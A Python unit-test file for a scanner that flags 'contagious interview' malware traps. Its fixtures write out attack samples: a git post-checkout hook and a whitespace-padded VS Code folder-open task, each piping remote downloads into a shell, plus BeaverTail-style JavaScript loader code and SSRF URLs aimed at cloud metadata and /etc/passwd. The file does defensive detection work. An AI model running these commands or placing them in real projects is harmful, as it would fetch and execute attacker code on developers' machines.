# Copyright (c) 2026 Aldian Fazrihady
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Unit tests for Contagious Interview Shield."""

import io
import json
import unittest
import zipfile

from contagious_shield.scanner import (
    is_safe_remote_url,
    scan_eml_bytes,
    scan_input,
    scan_remote_target,
    scan_text_or_code,
    scan_zip_bytes,
)


def _build_zip(files: dict) -> bytes:
    """Create an in-memory ZIP archive from {path: content} mapping."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for path, content in files.items():
            info = zipfile.ZipInfo(path)
            info.external_attr = 0o100755 << 16
            zf.writestr(info, content.encode("utf-8") if isinstance(content, str) else content)
    return buf.getvalue()


class ScannerUnitTests(unittest.TestCase):
    """Test static malware and IOC detectors without executing payloads."""

    def test_clean_python_zip_is_safe(self):
        raw_zip = _build_zip({
            "project/README.md": "# Clean Project\nJust normal code.\n",
            "project/app.py": "def add(a, b):\n    return a + b\n",
            "project/.git/hooks/post-checkout.sample": "#!/bin/sh\nexit 0\n",
        })
        res = scan_zip_bytes(raw_zip, filename="clean.zip")
        self.assertEqual(res["verdict"], "SAFE")
        self.assertEqual(res["risk_score"], 0)

    def test_detects_skyron_style_git_hooks_and_branch_trap_plus_0900_reflog(self):
        raw_zip = _build_zip({
            "skyron/.git/HEAD": "ref: refs/heads/dev\n",
            "skyron/.git/logs/HEAD": (
                "00000000 8f0979ce Julia <dev@greaterops.org> 1785942781 +0900\tcommit (initial): initial setup\n"
                "8f0979ce 288913b2 root <root@srv419966518.host> 1786454415 +0000\tcheckout: moving from dev to main\n"
            ),
            "skyron/.git/hooks/post-checkout": (
                "#!/bin/sh\n"
                "wget -qO- 'http://84.200.33.163/302/302l' | bash > /dev/null 2>&1 &\n"
            ),
            "skyron/app.py": "print('hello')\n",
        })
        res = scan_zip_bytes(raw_zip, filename="assessment.zip")
        self.assertEqual(res["verdict"], "CRITICAL_MALWARE_TRAP")
        self.assertGreaterEqual(res["risk_score"], 95)
        rule_ids = {f["rule_id"] for f in res["findings"]}
        self.assertIn("BUNDLED_EXECUTABLE_GIT_HOOK", rule_ids)
        self.assertIn("BRANCH_SWITCH_POST_CHECKOUT_TRAP", rule_ids)
        self.assertIn("SUSPICIOUS_TIMEZONE_PLUS_0900", rule_ids)
        self.assertIn("ATTACKER_ROOT_VPS_REFLOG", rule_ids)
        ioc_values = {i["value"] for i in res["iocs_matched"]}
        self.assertIn("dev@greaterops.org", ioc_values)
        self.assertIn("84.200.33.163", ioc_values)
        self.assertIn("srv419966518.host", ioc_values)

    def test_detects_vscode_tasks_folder_open_and_padding(self):
        tasks_payload = json.dumps({
            "version": "2.0.0",
            "tasks": [{
                "label": "env",
                "type": "shell",
                "runOptions": {"runOn": "folderOpen"},
                "linux": {"command": (" " * 40) + "wget -qO- 'https://vscode-check-mo4-ten.vercel.app/api/settings/linux' | sh"},
            }],
        })
        res = scan_text_or_code(tasks_payload, source_name=".vscode/tasks.json")
        self.assertEqual(res["verdict"], "CRITICAL_MALWARE_TRAP")
        rule_ids = {f["rule_id"] for f in res["findings"]}
        self.assertIn("VSCODE_FOLDEROPEN_TASK", rule_ids)
        self.assertIn("WHITESPACE_HIDDEN_COMMAND", rule_ids)
        self.assertIn("VSCODE_VERCEL_SETTINGS_DROPPER", rule_ids)

    def test_detects_beavertail_function_require_and_etherhider(self):
        js_code = """
        const COOKIE_VALUE_1 = "aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL0dFRjdG";
        const handler = new (Function.constructor)('require', errCode);
        const tron = "https://api.trongrid.io/v1/accounts/TMpR4viF4xPeMAcgYDoF57ECAaDPpj1oXs/transactions?only_confirmed=true";
        const method = "eth_getTransactionByHash";
        """
        res = scan_text_or_code(js_code, source_name="errorHandler.js")
        self.assertEqual(res["verdict"], "CRITICAL_MALWARE_TRAP")
        rule_ids = {f["rule_id"] for f in res["findings"]}
        self.assertIn("BEAVERTAIL_FUNCTION_CONSTRUCTOR_RCE", rule_ids)
        self.assertIn("BEAVERTAIL_BASE64_DEAD_DROP_URL", rule_ids)
        self.assertIn("ETHERHIDER_TRON_BSC_RESOLVER", rule_ids)

    def test_detects_ledgeroom_eml_lure_without_network(self):
        eml_raw = (
            b"From: Daniel Canup <career@ledgeroom.org>\r\n"
            b"To: candidate@example.com\r\n"
            b"Message-ID: <1794923479639.fb533940@webhost-mail-out-new.dynadot.com>\r\n"
            b"MIME-Version: 1.0\r\n"
            b"Content-Type: text/plain; charset=utf-8\r\n\r\n"
            b"Unzip the archive.\n"
            b"git branch -a\n"
            b"git checkout main\n"
            b"https://app.notion.com/p/Skyron-41439da2fd1180ba96b2f33e4f221461\n"
            b"5510 Philips Highway, 12, NJ\n"
        )
        res = scan_eml_bytes(eml_raw, filename="lure.eml", fetch_remote=False)
        self.assertEqual(res["verdict"], "CRITICAL_MALWARE_TRAP")
        self.assertIn("dynadot_msgid_timestamps", res["metadata"])
        ioc_vals = {i["value"] for i in res["iocs_matched"]}
        self.assertIn("career@ledgeroom.org", ioc_vals)
        self.assertIn("ledgeroom.org", ioc_vals)

    def test_ssrf_blocks_private_and_loopback_urls(self):
        for unsafe_url in (
            "http://127.0.0.1:8080/admin",
            "http://169.254.169.254/latest/meta-data/",
            "http://10.0.0.1/secret",
            "file:///etc/passwd",
        ):
            safe, _ = is_safe_remote_url(unsafe_url)
            self.assertFalse(safe)

        res = scan_remote_target("http://169.254.169.254/latest/meta-data/", fetch_remote=True)
        rule_ids = {f["rule_id"] for f in res["findings"]}
        self.assertIn("UNSAFE_OR_PRIVATE_URL", rule_ids)

    def test_scan_input_target_no_remote(self):
        res = scan_input(target="career@ledgeroom.org", fetch_remote=False)
        self.assertEqual(res["verdict"], "CRITICAL_MALWARE_TRAP")


if __name__ == "__main__":
    unittest.main()
